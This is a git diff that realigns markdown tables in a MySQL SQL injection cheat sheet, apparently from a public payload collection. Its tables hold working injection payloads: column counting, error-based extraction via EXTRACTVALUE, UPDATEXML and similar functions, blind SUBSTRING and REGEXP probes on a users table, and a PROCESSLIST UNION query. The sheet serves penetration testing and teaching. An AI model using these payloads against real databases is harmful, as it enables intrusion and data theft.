@@ -51,9 +51,9 @@
 
 ## MYSQL Default Databases
 
-| Name               | Description              |
-|--------------------|--------------------------|
-| mysql              | Requires root privileges |
+| Name               | Description                         |
+| ------------------ | ----------------------------------- |
+| mysql              | Requires root privileges            |
 | information_schema | Available from version 5 and higher |
 
 ## MYSQL Comments
@@ -61,7 +61,7 @@
 MySQL comments are annotations in SQL code that are ignored by the MySQL server during execution.
 
 | Type                       | Description                       |
-|----------------------------|-----------------------------------|
+| -------------------------- | --------------------------------- |
 | `#`                        | Hash comment                      |
 | `/* MYSQL Comment */`      | C-style comment                   |
 | `/*! MYSQL Special SQL */` | Special SQL                       |
@@ -148,11 +148,11 @@ ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
 
 This method is effective when error reporting is enabled. It can help determine the number of columns in cases where the injection point occurs after a LIMIT clause.
 
-| Payload                      | Error           |
-| ---------------------------- | --------------- |
+| Payload                      | Error                                                           |
+| ---------------------------- | --------------------------------------------------------------- |
 | `1' LIMIT 1,1 INTO @--+`     | `The used SELECT statements have a different number of columns` |
-| `1' LIMIT 1,1 INTO @,@--+`  | `The used SELECT statements have a different number of columns` |
-| `1' LIMIT 1,1 INTO @,@,@--+` | `No error means query uses 3 columns` |
+| `1' LIMIT 1,1 INTO @,@--+`   | `The used SELECT statements have a different number of columns` |
+| `1' LIMIT 1,1 INTO @,@,@--+` | `No error means query uses 3 columns`                           |
 
 Since the result doesn't show any error it means the query uses 3 columns: `-1' UNION SELECT 1,2,3--+`.
 
@@ -186,18 +186,18 @@ UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...
 
 Method for `MySQL >= 4.1`.
 
-| Payload | Output |
-| --- | --- |
-| `(1)and(SELECT * from db.users)=(1)` | Operand should contain **4** column(s) |
-| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null |
+| Payload                                                                   | Output                                 |
+| ------------------------------------------------------------------------- | -------------------------------------- |
+| `(1)and(SELECT * from db.users)=(1)`                                      | Operand should contain **4** column(s) |
+| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null         |
 
 Method for `MySQL 5`
 
-| Payload | Output |
-| --- | --- |
-| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a` | Duplicate column name '**id**' |
-| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a` | Duplicate column name '**name**' |
-| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data |
+| Payload                                                                  | Output                           |
+| ------------------------------------------------------------------------ | -------------------------------- |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a`                | Duplicate column name '**id**'   |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a`      | Duplicate column name '**name**' |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data                             |
 
 ### Extract Data Without Columns Name
 
@@ -220,16 +220,16 @@ MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SE
 
 ## MYSQL Error Based
 
-| Name         | Payload         |
-| ------------ | --------------- |
-| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -` |
+| Name         | Payload                                                                                        |
+| ------------ | ---------------------------------------------------------------------------------------------- |
+| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -`                                |
 | JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |
-| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -` |
-| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -` |
-| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -` |
-| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -` |
-| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--` |
-| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1` |
+| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -`                           |
+| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -`                        |
+| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -`              |
+| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -`         |
+| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--`          |
+| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1`                                                                |
 
 ### MYSQL Error Based - Basic
 
@@ -283,13 +283,13 @@ Works with `MySQL >= 5.0`
 
 ### MYSQL Blind With Substring Equivalent
 
-| Function | Example | Description |
-| --- | --- | --- |
-| `SUBSTR` | `SUBSTR(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |
-| `SUBSTRING` | `SUBSTRING(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |
-| `RIGHT` | `RIGHT(left(version(),1),1)=5` | Extracts a number of characters from a string (starting from right) |
-| `MID` | `MID(version(),1,1)=4` | Extracts a substring from a string (starting at any position) |
-| `LEFT` | `LEFT(version(),1)=4` | Extracts a number of characters from a string (starting from left) |
+| Function    | Example                        | Description                                                         |
+| ----------- | ------------------------------ | ------------------------------------------------------------------- |
+| `SUBSTR`    | `SUBSTR(version(),1,1)=5`      | Extracts a substring from a string (starting at any position)       |
+| `SUBSTRING` | `SUBSTRING(version(),1,1)=5`   | Extracts a substring from a string (starting at any position)       |
+| `RIGHT`     | `RIGHT(left(version(),1),1)=5` | Extracts a number of characters from a string (starting from right) |
+| `MID`       | `MID(version(),1,1)=4`         | Extracts a substring from a string (starting at any position)       |
+| `LEFT`      | `LEFT(version(),1)=4`          | Extracts a number of characters from a string (starting from left)  |
 
 Examples of Blind SQL injection using `SUBSTRING` or another equivalent function:
 
@@ -344,11 +344,11 @@ SELECT * FROM products WHERE product_name LIKE '%user_input%'
 
 Blind SQL injection can also be performed using the MySQL `REGEXP` operator, which is used for matching a string against a regular expression. This technique is particularly useful when attackers want to perform more complex pattern matching than what the `LIKE` operator can offer.
 
-| Payload | Description |
-| --- | --- |
-| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Checking length |
+| Payload                                                                | Description                         |
+| ---------------------------------------------------------------------- | ----------------------------------- |
+| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Checking length                     |
 | `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Checking for the presence of digits |
-| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Checking for data starting by "a" |
+| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Checking for data starting by "a"   |
 
 ## MYSQL Time Based
 
@@ -483,11 +483,11 @@ The `PROCESSLIST` table contains several important columns, each providing detai
 SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
 ```
 
-| ID  | USER      | HOST           | DB     | COMMAND | TIME | STATE      | INFO |
-| --- | --------- | ---------------- | ------- | ------- | ---- | ---------- | ---- |
-| 1   | root   | localhost        | testdb  | Query  | 10 | executing  | SELECT * FROM some_table |
-| 2   | app_uset  | 192.168.0.101    | appdb   | Sleep  | 300 | sleeping  | NULL |
-| 3   | gues_user | example.com:3360 | NULL    | Connect | 0    | connecting | NULL |
+| ID  | USER      | HOST             | DB     | COMMAND | TIME | STATE      | INFO                     |
+| --- | --------- | ---------------- | ------ | ------- | ---- | ---------- | ------------------------ |
+| 1   | root      | localhost        | testdb | Query   | 10   | executing  | SELECT * FROM some_table |
+| 2   | app_uset  | 192.168.0.101    | appdb  | Sleep   | 300  | sleeping   | NULL                     |
+| 3   | gues_user | example.com:3360 | NULL   | Connect | 0    | connecting | NULL                     |
 
 ```sql
 UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
